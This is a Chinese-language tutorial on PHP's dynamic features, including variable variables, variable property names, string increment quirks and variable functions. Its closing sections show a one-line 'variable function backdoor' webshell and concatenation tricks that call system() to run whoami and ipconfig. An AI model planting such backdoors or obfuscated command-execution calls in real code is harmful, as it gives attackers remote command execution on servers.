# PHP是一门动态语言

动态语言指在运行时确定数据类型的语言。变量被使用前不需要类型声明，通常变量的类型是被赋值的那个值的类型。

PHP是一门动态语言，且相对于其他语言，它拥有一些独特的特性入：动态变量、动态函数执行等。

**PS：以下代码均在PHP7.3/7.4环境下进行测试运行的**

# 动态变量

注意：超全局变量如：$_GET 不可用作可变变量。$this 变量也是一个特殊变量，不能被动态引用。

但是，实际执行中，$_GET 等超全局变量可以作为可变变量

```php
<?php
$_GET['a']='cc';
#$a是$_GET的中间变量,$_GET是最终变量
$a='_GET';
var_dump($$a);

$_POST='asdf';
$asdf='ccc';
var_dump($$_POST);
```

## **可变属性名**

```php
<?php
class foo {
    var $bar = 'I am bar.';
    var $arr = array('I am A.', 'I am B.', 'I am C.');
    var $r   = 'I am r.';
}

$foo = new foo();
$bar = 'bar';
$baz = array('foo', 'bar', 'baz', 'quux');
echo $foo->$bar . "\n";
echo $foo->{$baz[1]} . "\n";

$start = 'b';
$end   = 'ar';
echo $foo->{$start.$end} . "\n";

$arr = 'arr';
echo $foo->{$arr[1]} . "\n";
```

## 可变变量

1.使用 $$

```php
<?php
$a='b';
$b='c';
echo $$a;
echo ${$a};
```



2.动态变量拼接

```php
<?php
$a='a';
$b='b';
$ab='cccc';
echo ${$a.$b};
```

## 自增自减

1.对于 String 类型变量，可以通过`++`自增，但无法通过`--`自减

```php
<?php
$a='a';
$b='b ';
var_dump(++$a); # b 数值改变了
var_dump(--$b); # b 无改变
```

2.如果一个 String 变量的值为空，即`$a=''`，其通过自增自减均改变值，且变量类型会变。

```php
<?php
  <?php
$a='';
$b='';
var_dump(++$a); # string(1) "1" $a依旧是String类型
var_dump(--$b); # int(-1) $b变成了int类型
var_dump(++$a); # int(2) $a变成了int类型
```

# 动态函数

PS：可变函数不能用于[echo](http://php.net/manual/zh/function.echo.php)，[print](http://php.net/manual/zh/function.print.php)，[unset()](http://php.net/manual/zh/function.unset.php)，[isset()](http://php.net/manual/zh/function.isset.php)，[empty()](http://php.net/manual/zh/function.empty.php)，[include](http://php.net/manual/zh/function.include.php)，[require](http://php.net/manual/zh/function.require.php) 等类似的语言结构函数。

1.动态执行函数

```php
<?php
$a='phPinfo'; #php的函数忽略大小写，但是变量严格大小写
$a();
```

2.动态实例化类

```php
<?php
class cc{
}
$a='cc';
new $a();
```

3.可变函数后门

```php
<?php
$_POST['1']($_POST['2']
```

# Demo

```php
<?php
('sys'.'tem')('whoami');
join("",["sys","tem"])("ipconfig");
implode(['sys','tem'])("ipconfig");
```

